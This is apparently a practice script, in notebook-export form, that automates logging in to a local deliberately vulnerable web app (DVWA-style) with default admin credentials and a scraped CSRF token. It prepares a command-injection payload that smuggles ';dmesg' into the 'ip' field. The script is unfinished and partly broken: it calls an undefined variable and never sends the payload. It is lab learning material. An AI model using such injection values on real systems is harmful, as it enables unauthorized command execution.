# coding: utf-8
import requests
import re

base_url = 'http://localhost:8000'
login_url  = base_url + '/login.php'
exec_url   = base_url + '/vulnerabilities/exec/'
upload_url = base_url + '/vulnerabilities/upload/'

s = requests.Session()
GET_response = s.get(url)

#Extract token from response
token = re.search(b'user_token\' value=\'(.*?)\'', GET_response.content).groups()[0].decode('utf-8')
login_payload = dict(username='admin', password='password', user_token=token, Login='Login')
#correct URL is important 
b = s.post(url=login_url, data=login_payload)


#Cookie: PHPSESSID=ouac323t8q45r99ritqgdqf5e6; security=low\r\n
#using valid session key works: s.cookies.set('PHPSESSID', 'ouac323t8q45r99ritqgdqf5e6')
#command injection - TODO check how to encode ';' -> '%3B'
data = 'ip=%3Bdmesg&Submit=Submit'


#thanks to this g0tmi1k the command line ninja
get_ipython().system("curl -s -i -L -d $'username=user&password=pass&user_token=123&Login=Login' \
        localhost:8000/login.php > after.txt")

